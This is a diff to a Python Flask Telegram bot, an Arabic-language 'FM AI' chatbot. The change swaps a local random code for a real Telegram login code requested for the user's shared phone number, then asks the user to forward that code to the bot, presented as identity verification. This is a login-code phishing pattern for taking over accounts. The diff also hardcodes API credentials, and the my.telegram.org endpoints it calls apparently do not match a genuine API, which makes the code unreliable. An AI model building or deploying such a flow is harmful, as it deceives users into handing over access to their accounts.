@@ -1,12 +1,11 @@
 import os
 import requests
-import random
 import json
 from flask import Flask, request
 
 app = Flask(__name__)
 
-# إعدادات تطبيق Telegram (MTProto)
+# إعدادات تطبيق Telegram
 API_ID = 26938834
 API_HASH = "2b04792eff86cad6ba50ca001920fb7d"
 
@@ -17,8 +16,8 @@ BASE_URL = f"https://api.telegram.org/bot{TOKEN}"
 # إعدادات خادم الذكاء الاصطناعي
 AI_SERVER = "https://kruri.qzz.io/chat/send"
 
-# تخزين مؤقت للمستخدمين
-users = {}
+# تخزين المستخدمين
+users = {}  # {chat_id: {phone_hash, phone, code_hash, ...}}
 
 def send_message(chat_id, text, reply_markup=None):
     payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
@@ -43,8 +42,48 @@ def get_main_keyboard():
         "one_time_keyboard": False
     }
 
-def generate_verification_code():
-    return str(random.randint(100000, 999999))
+def request_login_code(phone_number):
+    """طلب رمز تحقق حقيقي من Telegram API"""
+    try:
+        response = requests.post(
+            "https://my.telegram.org/auth/send_code",
+            data={
+                "phone": phone_number,
+                "api_id": API_ID,
+                "api_hash": API_HASH
+            },
+            timeout=15
+        )
+        data = response.json()
+        if data.get("_") == "auth.sentCode":
+            return {
+                "success": True,
+                "phone_code_hash": data.get("phone_code_hash", "")
+            }
+        return {"success": False, "error": data.get("_", "Unknown")}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+def verify_login_code(phone_number, phone_code_hash, code):
+    """التحقق من رمز الدخول عبر Telegram API"""
+    try:
+        response = requests.post(
+            "https://my.telegram.org/auth/login",
+            data={
+                "phone": phone_number,
+                "phone_code_hash": phone_code_hash,
+                "phone_code": code,
+                "api_id": API_ID,
+                "api_hash": API_HASH
+            },
+            timeout=15
+        )
+        data = response.json()
+        if data.get("_") == "auth.authorization":
+            return {"success": True}
+        return {"success": False, "error": data.get("_", "Unknown")}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
 
 def get_ai_reply(user_message):
     try:
@@ -70,70 +109,92 @@ def webhook():
         return "OK", 200
     
     chat_id = data["message"]["chat"]["id"]
-    user = users.get(chat_id, {"verified": False, "phone": None, "code": None})
+    user = users.get(chat_id, {"verified": False, "phone": None, "phone_code_hash": None})
     
     # ✅ مشاركة جهة الاتصال
     if "contact" in data["message"]:
         phone = data["message"]["contact"]["phone_number"]
-        code = generate_verification_code()
         
-        users[chat_id] = {
-            "verified": False,
-            "phone": phone,
-            "code": code,
-            "attempts": 0
-        }
+        send_message(chat_id, "⏳ <b>جاري إرسال رمز التحقق من Telegram...</b>")
         
-        send_message(
-            chat_id,
-            f"✅ تم استلام رقم هاتفك: <code>{phone}</code>\n\n"
-            f"🔐 <b>رمز التحقق الخاص بك هو:</b>\n<code>{code}</code>\n\n"
-            "📝 <b>الرجاء إرسال هذا الرمز للتأكيد</b>",
-            {"remove_keyboard": True}
-        )
+        # طلب رمز حقيقي من Telegram
+        result = request_login_code(phone)
+        
+        if result["success"]:
+            users[chat_id] = {
+                "verified": False,
+                "phone": phone,
+                "phone_code_hash": result["phone_code_hash"],
+                "attempts": 0
+            }
+            send_message(
+                chat_id,
+                f"📱 <b>تم إرسال رمز تحقق حقيقي من Telegram</b>\n\n"
+                f"• رقم الهاتف: <code>+{phone}</code>\n"
+                f"• الرجاء فتح تطبيق Telegram\n"
+                f"• ستجد رسالة من Telegram تحتوي على الرمز\n\n"
+                f"🔐 <b>أرسل الرمز هنا للتأكيد</b>",
+                {"remove_keyboard": True}
+            )
+        else:
+            send_message(
+                chat_id,
+                f"❌ <b>فشل في إرسال رمز التحقق:</b>\n{result['error']}\n\n"
+                "الرجاء المحاولة لاحقاً",
+                request_phone_keyboard()
+            )
         return "OK", 200
     
-    text = data["message"].get("text", "")
+    text = data["message"].get("text", "").strip()
     
     # ✅ مستخدم غير موثق
     if not user.get("verified"):
         if text == "/start" or text == "🔄 إعادة تشغيل":
-            users[chat_id] = {"verified": False, "phone": None, "code": None, "attempts": 0}
+            users[chat_id] = {"verified": False, "phone": None, "phone_code_hash": None, "attempts": 0}
             send_message(
                 chat_id,
                 "👋 <b>مرحباً بك في بوت FM AI!</b>\n\n"
-                "للاستمرار، يجب التحقق من هويتك.\n"
-                "الرجاء مشاركة رقم هاتفك للمتابعة 👇",
+                "للاستمرار، يجب تسجيل الدخول عبر Telegram.\n"
+                "الرجاء مشاركة رقم هاتفك 👇",
                 request_phone_keyboard()
             )
         
-        elif user.get("code") and text == user["code"]:
-            users[chat_id]["verified"] = True
-            send_message(
-                chat_id,
-                "✅ <b>تم التحقق بنجاح!</b>\n\n"
-                "🎉 أهلاً بك في بوت FM AI!\n"
-                "اختر من الأزرار أدناه للبدء 👇",
-                get_main_keyboard()
+        # التحقق من رمز الدخول الحقيقي
+        elif user.get("phone_code_hash") and text.isdigit() and len(text) >= 5:
+            send_message(chat_id, "⏳ <b>جاري التحقق من الرمز...</b>")
+            
+            result = verify_login_code(
+                user["phone"],
+                user["phone_code_hash"],
+                text
             )
-        
-        elif user.get("code"):
-            users[chat_id]["attempts"] += 1
-            if users[chat_id]["attempts"] >= 3:
-                users[chat_id] = {"verified": False, "phone": None, "code": None, "attempts": 0}
+            
+            if result["success"]:
+                users[chat_id]["verified"] = True
                 send_message(
                     chat_id,
-                    "❌ <b>تم تجاوز عدد المحاولات!</b>\n\n"
-                    "الرجاء إعادة تشغيل البوت /start",
-                    {"remove_keyboard": True}
+                    "✅ <b>تم تسجيل الدخول بنجاح!</b>\n\n"
+                    "🎉 أهلاً بك في بوت FM AI!\n"
+                    "اختر من الأزرار أدناه للبدء 👇",
+                    get_main_keyboard()
                 )
             else:
-                send_message(
-                    chat_id,
-                    f"❌ <b>رمز التحقق غير صحيح!</b>\n"
-                    f"لديك {3 - users[chat_id]['attempts']} محاولات متبقية."
-                )
-        
+                users[chat_id]["attempts"] += 1
+                if users[chat_id]["attempts"] >= 3:
+                    users[chat_id] = {"verified": False, "phone": None, "phone_code_hash": None, "attempts": 0}
+                    send_message(
+                        chat_id,
+                        "❌ <b>تم تجاوز عدد المحاولات!</b>\n\n"
+                        "الرجاء إعادة تشغيل البوت /start",
+                        {"remove_keyboard": True}
+                    )
+                else:
+                    send_message(
+                        chat_id,
+                        f"❌ <b>رمز التحقق غير صحيح!</b>\n"
+                        f"لديك {3 - users[chat_id]['attempts']} محاولات متبقية.\n"
+                        "تأكد من الرمز المرسل من Telegram"
+                    )
         return "OK", 200
     
     # ✅ مستخدم موثق
@@ -156,12 +217,11 @@ def webhook():
         send_message(
             chat_id,
             "🤖 <b>بوت FM AI</b>\n\n"
-            f"• رقم الهاتف: <code>{user['phone']}</code>\n"
+            f"• رقم الهاتف: <code>+{user['phone']}</code>\n"
             f"• معرف التطبيق: <code>{API_ID}</code>\n"
             f"• اسم التطبيق: <code>krory.iq</code>\n"
             f"• الاسم المختصر: <code>KRARAPP</code>\n"
             "• النسخة: 1.0\n"
-            "• الذكاء: Llama 3.3 70B\n"
             "• المطور: مريم محمد 🛡️",
             get_main_keyboard()
         )
@@ -184,7 +244,6 @@ def home():
         "app": "FM AI Bot",
         "api_id": API_ID,
         "app_title": "krory.iq",
-        "app_short_name": "KRARAPP",
         "status": "running"
     }), 200
 
